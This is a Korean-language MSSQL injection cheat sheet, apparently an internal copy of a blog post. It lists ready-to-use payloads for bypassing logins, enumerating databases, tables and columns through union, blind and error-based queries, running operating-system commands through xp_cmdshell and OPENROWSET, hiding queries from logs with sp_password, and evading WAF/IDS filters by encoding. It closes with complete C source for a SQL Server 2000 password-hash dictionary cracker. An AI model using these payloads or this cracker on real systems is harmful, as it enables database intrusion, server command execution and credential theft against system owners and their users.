# MSSQL Injection Cheet Sheet
##### 링크: [KOROMOON][KOROMOONlink]
[KOROMOONlink]: https://koromoon.blogspot.com/2018/10/mssql-injection-cheet-sheet.html "Go KOROMOON"
##### 작성자: 김태현 사원
##### 작성일자: 2024년 4월 17일 
</br>

<br><div align="center"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTks81iuUfdMyDiGJs6xgSUxQEVA5zjfCDMgYShiNwWVDsgz9Drnr7p52BQDWhku98ZaALzGr6rFSBm2HqZVgCL-uYs4TlPYyxTpqCaWvR-vCcA7aUdpr-VzwLRMkkOnNojks9fLi1rCM/s1600/MSSQL+Injection.jpg"></div><br><br><br>

## (1) 기본 데이터베이스
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/0d754497-e8a3-4ea7-99e8-dc7dea8f9acf)


<br><br><br>

## (2) 코멘트 아웃 쿼리(Comment Out Query)

여기서 코멘트 아웃(Comment Out)이란 디버그에서 자주 사용되는 방법으로 코멘트를 지시하는 문을 삽입하여 프로그램이나 명령어 집합의 일부를 일시적으로 사용하지 않는 것을 말함.<br><br>

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/32aaba19-680c-4cc2-9670-b1d33e23d718)
<br><br>
예 :<br>
`SELECT * FROM Users WHERE username = '' OR 1=1 --' AND password = '';`<br>
`SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3/*';`<br><br><br>



## (3) 버전 테스팅

`@@VERSION`<br><br>

예 :<br>
MSSQL 버전이 2008 인 경우 참임.<br>
`SELECT * FROM Users WHERE id = '1' AND @@VERSION LIKE '%2008%';`<br><br>

노트 :<br>
결과값에 윈도우 운영 체제 버전도 포함됨.<br><br><br>


## (4) 데이터베이스 자격 증명

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/0f5cfc77-20ee-466b-84b9-2a736a648d76)
<br><br>
예 :<br>
현재 사용자 반환 :<br>
`SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID;`<br><br>

사용자가 관리자인지 확인하십시오 :<br>
`SELECT (CASE WHEN (IS_SRVROLEMEMBER('sysadmin')=1) THEN '1' ELSE '0' END);`<br><br><br>


## (5) 데이터베이스 이름
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/0a77393f-3fa0-494f-8b55-0e7443bcc915)
<br><br>
예 :<br>
`SELECT DB_NAME(5);`<br>
`SELECT name FROM master..sysdatabases;`<br><br><br>



## (6) 서버 호스트 이름
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/0b7a9612-d675-4a05-a4ad-d0f3dd191e50)
<br><br>
예 :<br>
`SELECT SERVERPROPERTY('productversion'), SERVERPROPERTY('productlevel'), SERVERPROPERTY('edition');`<br><br>

노트 :<br>
SERVERPROPERTY() 는 MSSQL 2005 이상에서 사용할 수 있음.<br><br><br>




## (7) 테이블과 컬럼

**① 컬럼 수 결정**<br><br>

`ORDER BY n+1;`<br><br>
예 :<br>
`주어진 쿼리 SELECT username, password, permission FROM Users WHERE id = '1';`<br>&nbsp;

1' ORDER BY 1--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참<br>
1' ORDER BY 2--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참<br>
1' ORDER BY 3--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참<br>
1' ORDER BY 4--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;거짓 - 쿼리는 3 개의 컬럼만 사용함.<br>
-1' UNION SELECT 1,2,3--&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참<br><br>

노트 :<br>
거짓 결과값이 출력될 때까지 번호를 계속 증가시킴.<br><br>

다음은 현재 쿼리에서 컬럼을 가져오는데 사용할 수 있음.<br><br>

`GROUP BY / HAVING`<br><br>

예 :<br>
`주어진 쿼리 SELECT username, password, permission FROM Users WHERE id = '1';`<br><br>

`1' HAVING 1=1--`<br>
`'Users.username' 컬럼은 집계 함수 또는 GROUP BY 절에 포함되어 있지 않기 때문에 선택 목록에서 유효하지 않음.`<br><br>

`1' GROUP BY username HAVING 1=1--`<br>
`'Users.password' 컬럼은 집계 함수 또는 GROUP BY 절에 포함되어 있지 않기 때문에 선택 목록에서 유효하지 않음.`<br><br>

`1' GROUP BY username, password HAVING 1=1--`<br>
`'Users.permission' 컬럼은 집계 함수 또는 GROUP BY 절에 포함되어 있지 않기 때문에 선택 목록에서 유효하지 않음.`<br><br>

`1' GROUP BY username, password, permission HAVING 1=1--`<br>
`에러 없음.`<br><br>

노트 :<br>
모든 컬럼이 포함되면 에러는 반환되지 않음.<br><br>

**② 테이블 검색**<br><br>

우리는 두 개의 서로 다른 데이터베이스(information_schema.tables 또는 master..sysobjects)에서 테이블을 검색할 수 있음.<br><br>

**ⓐ Union**<br><br>

`UNION SELECT name FROM master..sysobjects WHERE xtype='U'`<br><br>

**ⓑ Blind**<br><br>

`AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'`<br><br>

**ⓒ Error**<br><br>

`AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables)`<br>
`AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables))`<br><br>

노트 :<br>
Xtype = 'U' 는 사용자 정의 테이블임. 뷰에서는 'V' 를 사용할 수 있음.<br><br>

**③ 컬럼 검색**<br><br>

우리는 두 개의 서로 다른 데이터베이스(information_schema.tables 또는 master..sysobjects)에서 컬럼을 검색할 수 있음.<br><br>

**ⓐ Union**<br><br>

`UNION SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = 'tablename')`<br><br>

**ⓑ Blind**<br><br>

`AND SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns > 'A'`<br><br>

**ⓒ Error**<br><br>

`AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns)`<br>
`AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns WHERE column_name NOT IN(SELECT TOP 1 column_name FROM information_schema.columns))`<br><br>

**④ 한 번에 여러 테이블/컬럼 검색**<br><br>

다음 세 가지 쿼리는 임시 테이블/컬럼을 만들고 모든 사용자 정의 테이블을 해당 테이블에 삽입함. 그런 다음 테이블 내용을 덤프하고 테이블을 삭제하여 마침.<br><br>

임시 테이블/컬럼 만들기 및 데이터 삽입 :<br>
`AND 1=0; BEGIN DECLARE @xy varchar(8000) SET @xy=':' SELECT @xy=@xy+' '+name FROM sysobjects WHERE xtype='U' AND name>@xy SELECT @xy AS xy INTO TMP_DB END;`<br><br>

컨텐츠 덤프 :<br>
`AND 1=(SELECT TOP 1 SUBSTRING(xy,1,353) FROM TMP_DB);`<br><br>

테이블 삭제 :<br>
`AND 1=0; DROP TABLE TMP_DB;`<br><br>

더 쉬운 방법은 MSSQL 2005 이상부터 시작됨.<br>
XML PATH() 함수는 하나의 쿼리로 모든 테이블을 검색할 수 있도록 연결자로 작동함.<br><br>
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/48b93152-4f29-4b3c-a852-96a1adb085b6)<br><br>
노트 :<br>
쿼리를 16진수로 인코딩하여 공격을 난독화할 수 있음.<br>
`' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x44524f50205441424c4520544d505f44423b AS VARCHAR(4000)); EXEC (@S);--`<br><br><br>





## (8) 인용 기호 피하기

`SELECT * FROM Users WHERE username = CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110)`<br><br><br>


## (9) 문자열 연결
`SELECT CONCAT('a','a','a'); (SQL SERVER 2012)
SELECT 'a'+'d'+'mi'+'n';`<br><br><br>




## (10) 조건문
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/5a01a082-5220-43b7-912c-a9c3895ce90a)
<br><br>
예 :<br>
`IF 1=1 SELECT 'true' ELSE SELECT 'false';`<br>
`SELECT CASE WHEN 1=1 THEN true ELSE false END;`<br><br>

노트 :<br>
IF 는 SELEC 문 내에서 사용할 수 없음.<br><br><br>

## (11) 타이밍

`WAITFOR DELAY 'time_to_pass';`<br>
`WAITFOR TIME 'time_to_execute';`<br><br>

예 :<br>
`IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';`<br><br><br>



## (12) OPENROWSET 공격

`SELECT * FROM OPENROWSET('SQLOLEDB', '127.0.0.1';'sa';'p4ssw0rd', 'SET FMTONLY OFF execute master..xp_cmdshell "dir"');`<br><br><br>



## (13) 시스템 명령어 실행

운영 체제 명령어를 실행하도록 하는 xp_cmdshell 확장 저장 프로시서를 포함시켜야 함.<br><br>

`EXEC master.dbo.xp_cmdshell 'cmd';`<br><br>

MSSQL 2005 이상 버전부터 xp_cmdshell 은 기본적으로 비활성화되어 있지만 다음 쿼리를 사용하여 활성화시킬 수 있음.<br><br>
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/b230fab6-eab5-4eae-80a5-c4d30514cf24)
<br><br>
또는, 동일한 결과를 얻기 위해 자체 프로시저를 만들 수 있음.<br><br>
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/fa3e8b41-f145-4f4c-9df9-79b56d864eb1)
<br><br>
SQL 버전이 2000 보다 높으면 이전 명령을 실행하기 위해 추가 쿼리를 실행해야 함.<br><br>
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/e23a453d-167c-4bb9-ba4f-6e491be594aa)
<br><br>
예 :<br>
`xp_cmdshell 이 로드되어 활성화되어 있는지 확인한 다음 dir 명령어를 실행하여 그 결과값을 TMP_DB에 삽입함 :`<br>
`' IF EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='TMP_DB') DROP TABLE TMP_DB DECLARE @a varchar(8000) IF EXISTS(SELECT * FROM dbo.sysobjects WHERE id = object_id (N'[dbo].[xp_cmdshell]') AND OBJECTPROPERTY (id, N'IsExtendedProc') = 1) BEGIN CREATE TABLE %23xp_cmdshell (name nvarchar(11), min int, max int, config_value int, run_value int) INSERT %23xp_cmdshell EXEC master..sp_configure 'xp_cmdshell' IF EXISTS (SELECT * FROM %23xp_cmdshell WHERE config_value=1)BEGIN CREATE TABLE %23Data (dir varchar(8000)) INSERT %23Data EXEC master..xp_cmdshell 'dir' SELECT @a='' SELECT @a=Replace(@a%2B'<br></font><font color="black">'%2Bdir,'<dir>','</font><font color="orange">') FROM %23Data WHERE dir>@a DROP TABLE %23Data END ELSE SELECT @a='xp_cmdshell not enabled' DROP TABLE %23xp_cmdshell END ELSE SELECT @a='xp_cmdshell not found' SELECT @a AS tbl INTO TMP_DB--`<br><br>

컨텐츠 덤프 :<br>
`' UNION SELECT tbl FROM TMP_DB--`<br><br>

테이블 삭제 :<br>
`' DROP TABLE TMP_DB--`<br><br><br>



## (14) SP_PASSWORD (쿼리 숨기기)

쿼리 끝에 sp_password 를 추가하면 T-SQL 로그에서 sp_password 를 숨김.<br><br>

`SP_PASSWORD`<br><br>

예 :<br>
`' AND 1=1--sp_password`<br><br>

결과값 :<br>
-- 'sp_password'는 이 이벤트의 텍스트에서 발견되었습니다.<br>
-- 보안상의 이유로 텍스트에 주석으로 대체되었습니다.<br><br><br>



## (15) 누적된 쿼리(Stacked Queries)

MSSQL 은 누적된 쿼리(Stacked Queries)를 지원함.<br><br>

예 :<br>
`' AND 1=0 INSERT INTO ([column1], [column2]) VALUES ('value1', 'value2');`<br><br><br>



## (16) 퍼징(Fuzzing)과 난독화(Obfuscation)

**① 허용된 중간 문자열**<br><br>

다음 문자는 공백으로 사용할 수 있음.<br><br>
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/e13ddea1-c1e7-467d-8af2-b202f959bb09)
<br><br>
예 :<br>
`S%E%L%E%C%T%01column%02FROM%03table;`<br>
`A%%ND 1=%%%%%%%%1;`<br><br>

노트 :<br>
키워드 간 백분율 기호는 ASP(X) 웹 응용 프로그램에서만 가능함.<br><br>

공백을 사용하지 않으려면 다음 문자를 사용할 수도 있음.<br><br>
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/edbdba4d-6028-4735-9ff4-ce381ef558a4)
<br><br>
예 :<br>
`UNION(SELECT(column)FROM(table));`<br>
`SELECT"table_name"FROM[information_schema].[tables];`<br><br>

**② AND/OR 뒤에 허용되는 중간 문자열**<br><br>
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/fbbcb836-a290-43a5-b22d-fa2bebe58b3d)
<br><br>
예 :<br>
`SELECT 1FROM[table]WHERE\1=\1AND\1=\1;`<br><br>

노트 :<br>
백슬러시는 MSSQL 2000 에서는 작동하지 않음.<br><br>

**③ 인코딩**<br><br>

주입을 인코딩하면 WAF/IDS 우회에 유용할 때도 있음.<br><br>
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/72219964-16c4-4aaf-ab4b-0d097aecd1fb)
<br><br><br>


## (17) 패스워드 해싱(Password Hashing)

암호는 0x0100 으로 시작하며 0x 다음에 오는 바이트는 첫 번째는 상수임.<br>
다음 8 바이트는 해시 Salt 이고 나머지 80 바이트는 2 해시임.<br>
여기서 첫 번째 40 바이트는 암호의 대/소문자를 구분하는 해시이고 두 번째 40 바이트는 대문자 버전임.<br><br>
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/287aad76-e861-406a-be3d-5aa80bd05adc)
<br><br><br>



### (18) 패스워드 크랙(Password Cracking)

JTR 용 Metasploit 모듈은 아래 링크에서 찾을 수 있음.<br>
http://www.metasploit.com/modules/auxiliary/analyze/jtr_mssql_fast<br><br>

**① MSSQL 2000 Password Cracker**<br><br>

해당 코드는 Microsoft SQL Server 2000 암호를 해독하도록 설계됨.<br><br>

```/////////////////////////////////////////////////////////////////////////////////
//
//           SQLCrackCl
//
//           This will perform a dictionary attack against the
//           upper-cased hash for a password. Once this
//           has been discovered try all case variant to work
//           out the case sensitive password.
//
//           This code was written by David Litchfield to
//           demonstrate how Microsoft SQL Server 2000
//           passwords can be attacked. This can be
//           optimized considerably by not using the CryptoAPI.
//
//           (Compile with VC++ and link with advapi32.lib
//           Ensure the Platform SDK has been installed, too!)
//
//////////////////////////////////////////////////////////////////////////////////
#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>
FILE *fd=NULL;
char *lerr = "\nLength Error!\n";
int wd=0;
int OpenPasswordFile(char *pwdfile);
int CrackPassword(char *hash);
int main(int argc, char *argv[])
{
                    int err = 0;
               if(argc !=3)
                         {
                                   printf("\n\n*** SQLCrack *** \n\n");
                                   printf("C:\\>%s hash passwd-file\n\n",argv[0]);
                                   printf("David Litchfield (david@ngssoftware.com)\n");
                                   printf("24th June 2002\n");
                                   return 0;
                         }
               err = OpenPasswordFile(argv[2]);
               if(err !=0)
                {
                  return printf("\nThere was an error opening the password file %s\n",argv[2]);
                }
               err = CrackPassword(argv[1]);
               fclose(fd);
               printf("\n\n%d",wd);
               return 0;
}
int OpenPasswordFile(char *pwdfile)
{
               fd = fopen(pwdfile,"r");
               if(fd)
                         return 0;
               else
                         return 1;
}
int CrackPassword(char *hash)
{
               char phash[100]="";
               char pheader[8]="";
               char pkey[12]="";
               char pnorm[44]="";
               char pucase[44]="";
               char pucfirst[8]="";
               char wttf[44]="";
               char uwttf[100]="";
               char *wp=NULL;
               char *ptr=NULL;
               int cnt = 0;
               int count = 0;
               unsigned int key=0;
               unsigned int t=0;
               unsigned int address = 0;
               unsigned char cmp=0;
               unsigned char x=0;
               HCRYPTPROV hProv=0;
               HCRYPTHASH hHash;
DWORD hl=100;
unsigned char szhash[100]="";
int len=0;
if(strlen(hash) !=94)
                 {
                         return printf("\nThe password hash is too short!\n");
                 }
if(hash[0]==0x30 && (hash[1]== 'x' || hash[1] == 'X'))
                 {
                         hash = hash + 2;
                         strncpy(pheader,hash,4);
                         printf("\nHeader\t\t: %s",pheader);
                         if(strlen(pheader)!=4)
                                   return printf("%s",lerr);
                         hash = hash + 4;
                         strncpy(pkey,hash,8);
                         printf("\nRand key\t: %s",pkey);
                         if(strlen(pkey)!=8)
                                   return printf("%s",lerr);
                         hash = hash + 8;
                         strncpy(pnorm,hash,40);
                         printf("\nNormal\t\t: %s",pnorm);
                         if(strlen(pnorm)!=40)
                                   return printf("%s",lerr);
                         hash = hash + 40;
                         strncpy(pucase,hash,40);
                         printf("\nUpper Case\t: %s",pucase);
                         if(strlen(pucase)!=40)
                                   return printf("%s",lerr);
                         strncpy(pucfirst,pucase,2);
                         sscanf(pucfirst,"%x",&cmp);
                 }
else
                 {
                         return printf("The password hash has an invalid format!\n");
                 }
printf("\n\n       Trying...\n");
if(!CryptAcquireContextW(&hProv, NULL , NULL , PROV_RSA_FULL                 ,0))
  {
                 if(GetLastError()==NTE_BAD_KEYSET)
                         {
                                   // KeySet does not exist. So create a new keyset
                                   if(!CryptAcquireContext(&hProv,
                                                        NULL,
                                                        NULL,
                                                        PROV_RSA_FULL,
                                                        CRYPT_NEWKEYSET ))
                                      {
                                               printf("FAILLLLLLL!!!");
                                               return FALSE;
                                      }
                  }
}
while(1)
                {
                  // get a word to try from the file
                  ZeroMemory(wttf,44);
                  if(!fgets(wttf,40,fd))
                     return printf("\nEnd of password file. Didn't find the password.\n");
                  wd++;
                  len = strlen(wttf);
                  wttf[len-1]=0x00;
                  ZeroMemory(uwttf,84);
                  // Convert the word to UNICODE
                  while(count < len)
                            {
                                      uwttf[cnt]=wttf[count];
                                      cnt++;
                                      uwttf[cnt]=0x00;
                                      count++;
                                      cnt++;
                            }
                  len --;
                  wp = &uwttf;
                  sscanf(pkey,"%x",&key);
                  cnt = cnt - 2;
                  // Append the random stuff to the end of
                  // the uppercase unicode password
                  t = key >> 24;
                  x = (unsigned char) t;
                  uwttf[cnt]=x;
                  cnt++;
                  t = key << 8;
                  t = t >> 24;
                x = (unsigned char) t;
                uwttf[cnt]=x;
                cnt++;
                t = key << 16;
                t = t >> 24;
                x = (unsigned char) t;
                uwttf[cnt]=x;
                cnt++;
                t = key << 24;
                t = t >> 24;
                x = (unsigned char) t;
                uwttf[cnt]=x;
                cnt++;
// Create the hash
if(!CryptCreateHash(hProv, CALG_SHA, 0 , 0, &hHash))
                {
                          printf("Error %x during CryptCreatHash!\n", GetLastError());
                          return 0;
                }
if(!CryptHashData(hHash, (BYTE *)uwttf, len*2+4, 0))
                {
                          printf("Error %x during CryptHashData!\n", GetLastError());
                          return FALSE;
                }
CryptGetHashParam(hHash,HP_HASHVAL,(byte*)szhash,&hl,0);
// Test the first byte only. Much quicker.
if(szhash[0] == cmp)
                {
                          // If first byte matches try the rest
                          ptr = pucase;
                          cnt = 1;
                          while(cnt < 20)
                          {
                                      ptr = ptr + 2;
                                      strncpy(pucfirst,ptr,2);
                                      sscanf(pucfirst,"%x",&cmp);
                                      if(szhash[cnt]==cmp)
                                               cnt ++;
                                      else
                                      {
                                               break;
                                      }
                          }
                          if(cnt == 20)
                          {
                               // We've found the password
                               printf("\nA MATCH!!! Password is %s\n",wttf);
                               return 0;
                            }
                    }
                    count = 0;
                    cnt=0;
                  }
  return 0;
}
```
